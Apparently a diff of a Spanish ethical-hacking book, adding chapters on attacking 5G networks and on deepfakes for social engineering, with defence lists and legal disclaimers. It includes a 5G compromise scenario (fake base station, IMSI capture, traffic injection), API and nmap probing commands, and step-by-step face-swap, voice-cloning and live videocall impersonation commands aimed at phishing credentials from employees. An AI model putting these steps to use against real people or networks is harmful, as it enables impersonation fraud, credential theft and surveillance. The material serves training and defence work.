+⚠ Solo en laboratorio aislado.
+
+---
+
+## 35.7. Interceptación de Tráfico en 5G NSA
+
+En despliegues **NSA (Non-Standalone)**, parte del tráfico aún pasa por infraestructura 4G LTE vulnerable:
+
+* Ataques a S1-U y S1-MME.
+* Interceptación con herramientas como **srsLTE**.
+
+---
+
+## 35.8. Escenario Completo – Compromiso de Red 5G
+
+1. **Reconocimiento**: identificar frecuencias y celdas con SDR.
+2. **Simulación de gNodeB** para atraer dispositivos.
+3. **Captura IMSI** y datos de sesión.
+4. **Inyección de tráfico malicioso** vía plano de usuario.
+5. **Pivoting** hacia core 5G a través de APIs expuestas.
+
+---
+
+## 35.9. Ataques a APIs 5G
+
+Las redes modernas usan APIs REST para interconectar funciones:
+
+```bash
+curl -X GET http://core5g.local/api/v1/subscribers
+```
+
+Si no están autenticadas o cifradas correctamente, permiten acceso a datos masivos.
+
+---
+
+## 35.10. Laboratorio – Ataque al Core 5G Virtualizado
+
+En entornos de prueba como **Open5GS**:
+
+1. Desplegar core en contenedores Docker.
+2. Escanear con Nmap:
+
+```bash
+nmap -p 80,443,5000,8080 core5g.local
+```
+
+3. Explorar vulnerabilidades en paneles web o APIs.
+
+---
+
+## 35.11. Contramedidas y Defensa
+
+* Autenticación y cifrado robusto en APIs.
+* Aislamiento de funciones de red virtualizadas.
+* Monitoreo de anomalías en señalización.
+* Detección de IMSI catchers mediante apps y sensores de red.
+* Segmentación estricta entre core y edge.
+
+---
+
+## 35.12. Cierre
+
+El hacking en redes 5G es un campo nuevo pero explosivo: el riesgo no está solo en la infraestructura, sino en la interconexión de millones de dispositivos.
+Un fallo aquí puede escalar más rápido que en cualquier otra tecnología de comunicación previa.
+
+---
+
+💡 **TIP Black-Hat Ético:** en 5G, un exploit no ataca un servidor: ataca un ecosistema entero en milisegundos.
+
+---
+
+
+# **Capítulo 36 – Deepfakes y Manipulación Multimedia para Operaciones de Ingeniería Social**
+
+*Hackeando la percepción humana para abrir puertas digitales y físicas*
+
+---
+
+## 36.1. Introducción
+
+Los **deepfakes** son medios audiovisuales manipulados mediante inteligencia artificial, capaces de reemplazar rostros, modificar voces o incluso generar personas y situaciones completamente ficticias con un alto nivel de realismo.
+En manos de un atacante, un deepfake puede:
+
+* **Suplantar identidades** para fraudes financieros.
+* **Generar pruebas falsas** en extorsiones.
+* **Alterar reputaciones** en campañas de desinformación.
+* **Convencer víctimas** para entregar información sensible.
+
+Casos reales:
+
+* **Fraude de CEO (2020)**: uso de deepfake de voz para ordenar transferencias bancarias.
+* **Operaciones políticas** con videos falsos para manipular opinión pública.
+* **Phishing avanzado** en videollamadas usando rostro y voz clonados.
+
+---
+
+## 36.2. Tipos de Deepfakes y Manipulación Multimedia
+
+| Tipo                    | Descripción                                   | Uso ofensivo                         |
+| ----------------------- | --------------------------------------------- | ------------------------------------ |
+| **Face-swap**           | Reemplazo de rostro en video o imagen         | Suplantar identidad en videollamadas |
+| **Voice cloning**       | Síntesis de voz realista                      | Llamadas fraudulentas                |
+| **Lip-sync**            | Alterar labios para coincidir con nuevo audio | Falsas declaraciones                 |
+| **Full-body**           | Generar movimiento corporal realista          | Creación de escenas falsas           |
+| **Generación completa** | Crear videos de personas inexistentes         | Identidades falsas en redes sociales |
+
+---
+
+## 36.3. Herramientas Comunes
+
+* **DeepFaceLab** – Face-swap avanzado.
+* **Faceswap** – Open source para intercambio de rostros.
+* **Respeecher / ElevenLabs** – Clonado de voz realista.
+* **Wav2Lip** – Sincronización labial con nuevo audio.
+* **Stable Diffusion + ControlNet** – Generación de imágenes hiperrealistas.
+* **Deepware Scanner** – Detección de deepfakes (para defensa).
+
+---
+
+## 36.4. Laboratorio – Creación de Deepfake de Rostro
+
+1. **Instalar DeepFaceLab**:
+
+   * Descargar versión GPU para Windows/Linux.
+2. **Extraer rostros**:
+
+```bash
+python main.py extract --input-dir ./video_original --output-dir ./rostros
+```
+
+3. **Entrenar modelo**:
+
+```bash
+python main.py train --model SAEHD --data-dir ./rostros
+```
+
+4. **Reemplazar rostro en video destino**:
+
+```bash
+python main.py merge --input-dir ./video_destino --output ./video_fake.mp4
+```
+
+---
+
+## 36.5. Laboratorio – Clonado de Voz
+
+Usando **so-vits-svc** (open source):
+
+```bash
+git clone https://github.com/svc-develop-team/so-vits-svc
+python train.py --dataset ./grabaciones --config config.json
+python inference.py --input sample.wav --output clon.wav
+```
+
+* Dataset: 3–5 minutos de voz clara.
+* Aplicación: suplantar identidad en llamada VoIP.
+
+---
+
+## 36.6. Escenario de Phishing con Deepfake
+
+1. **OSINT** – Obtener fotos y videos de la víctima (LinkedIn, Instagram, entrevistas).
+2. **Generar modelo** de rostro y voz.
+3. **Crear video corto** solicitando acción urgente (ej: “Autoriza esta transferencia”).
+4. **Enviar vía email o WhatsApp** simulando comunicación directa.
+
+---
+
+## 36.7. Deepfakes en Videollamadas en Tiempo Real
+
+Herramientas como **Avatarify** o **DeepFaceLive** permiten transmitir la cámara con rostro modificado en vivo.
+
+```bash
+python run.py --avatar ./modelo.pth --cam 0
+```
+
+Aplicable en Zoom, Teams o Meet para impersonación directa.
+
+---
+
+## 36.8. Ejercicio Completo – Operación de Ingeniería Social con Deepfake
+
+**Objetivo:** Obtener credenciales de acceso interno.
+
+1. Crear deepfake del director de la empresa.
+2. Contactar a empleado clave vía videollamada.
+3. Solicitar envío de credenciales “por emergencia”.
+4. Evaluar tiempo de respuesta y nivel de confianza.
+5. Redactar informe para defensa.
+
+---
+
+## 36.9. Técnicas de Defensa
+
+* **Verificación en múltiples canales** (llamada adicional, código seguro).
+* **Capacitación** para reconocer señales de deepfake (parpadeo anormal, artefactos visuales).
+* **Monitoreo de redes sociales** para limitar material de entrenamiento.
+* **Herramientas de detección** como Deepware Scanner o Reality Defender.
+* **Política de no actuar solo con base en videos/mensajes no verificados**.
+
+---
+
+## 36.10. Cierre
+
+Los deepfakes han pasado de ser una curiosidad tecnológica a una herramienta ofensiva de primer nivel. Su combinación con ingeniería social crea un vector de ataque extremadamente convincente y difícil de detectar.
+En ciberseguridad ofensiva, dominar estas técnicas en laboratorio permite preparar defensas antes de que un adversario real las use con éxito.
+
+---
+
+💡 **TIP Black-Hat Ético:** si una imagen vale mil palabras, un deepfake convincente puede valer un millón… o costar millones.
+
+---
+
+
+# **Capítulo 37 – Cierre, Despedida y Declaración Final**
 
 *Reflexiones finales, responsabilidad y el verdadero sentido del hacking ético*
 
 ---
 
-## 29.1. El viaje que hemos hecho juntos
+## 37.1. El viaje que hemos hecho juntos
 
 A lo largo de este libro, hemos recorrido técnicas, herramientas y tácticas que, en manos equivocadas, podrían causar daños inmensos. Desde los ataques más básicos de reconocimiento hasta las técnicas más agresivas de explotación, exfiltración y persistencia, hemos visto **cómo operan los atacantes reales** y, más importante, **cómo detectar, prevenir y mitigar esas acciones**.
 
@@ -5257,7 +6528,7 @@ Si llegaste hasta aquí, ya no eres la misma persona que empezó este viaje:
 
 ---
 
-## 29.2. El propósito de este libro
+## 37.2. El propósito de este libro
 
 Este no es un manual para “hackear por diversión” ni un catálogo para delinquir.
 El propósito central es **educar y entrenar** para que las personas encargadas de la seguridad informática puedan **ponerse en la piel de un atacante** y así anticipar, reforzar y blindar sus sistemas.
@@ -5270,7 +6541,7 @@ La **Biblia Negra del Ethical Hacking** quiere ser una herramienta para:
 
 ---
 
-## 29.3. Importancia del laboratorio controlado
+## 37.3. Importancia del laboratorio controlado
 
 Todo lo que hemos practicado debe ejecutarse en **entornos cerrados y aislados**, como:
 
@@ -5286,7 +6557,7 @@ Un entorno de laboratorio:
 
 ---
 
-## 29.4. Declaración y responsabilidad legal
+## 37.4. Declaración y responsabilidad legal
 
 ⚠ **DECLARACIÓN LEGAL IMPORTANTE:**
 El autor de este libro, el editor y cualquier persona asociada **NO se hacen responsables** de las acciones que el lector pueda realizar fuera del contexto legal y autorizado.
@@ -5299,7 +6570,7 @@ Aplicar cualquiera de las técnicas explicadas en sistemas o redes que no sean d
 
 ---
 
-## 29.5. Hacking ético vs. hacking criminal
+## 37.5. Hacking ético vs. hacking criminal
 
 La diferencia entre un hacker ético y uno criminal **no está en la técnica, sino en el contexto y la intención**.
 
@@ -5310,7 +6581,7 @@ En un pentest, tu trabajo es **ser el atacante, pero con contrato y límites cla
 
 ---
 
-## 29.6. La mentalidad correcta
+## 37.6. La mentalidad correcta
 
 Un buen pentester:
 
@@ -5323,7 +6594,7 @@ Recuerda: **la curiosidad no es excusa para la ilegalidad**.
 
 ---
 
-## 29.7. Recomendaciones para seguir aprendiendo
+## 37.7. Recomendaciones para seguir aprendiendo
 
 * Practicar en plataformas como Hack The Box, TryHackMe, VulnHub.
 * Mantenerse actualizado en exploits, parches y CVEs.
@@ -5332,7 +6603,7 @@ Recuerda: **la curiosidad no es excusa para la ilegalidad**.
 
 ---
 
-## 29.8. El lado humano de la ciberseguridad
+## 37.8. El lado humano de la ciberseguridad
 
 Más allá del código y los exploits, la ciberseguridad es un trabajo que **protege vidas, datos y recursos**.
 Un ataque puede:
@@ -5345,7 +6616,7 @@ Por eso, entender el “lado oscuro” es una responsabilidad que debe asumirse 
 
 ---
 
-## 29.9. Mensaje final del autor
+## 37.9. Mensaje final del autor
 
 Querido lector:
 Este libro no es el final de un camino, sino el inicio de una responsabilidad. Ahora que conoces las armas, tu tarea es **ser un guardián, no un depredador**.
@@ -5357,7 +6628,7 @@ Si alguna vez dudas sobre la legalidad o moralidad de una acción, detente y eva
 
 ---
 
-## 29.10. **DISCLAIMER EXTENDIDO**
+## 37.10. **DISCLAIMER EXTENDIDO**
 
 * **Todo** el contenido aquí descrito debe ejecutarse únicamente en entornos de laboratorio controlados.
 * **Nunca** ataques sistemas en producción o redes ajenas sin autorización escrita.
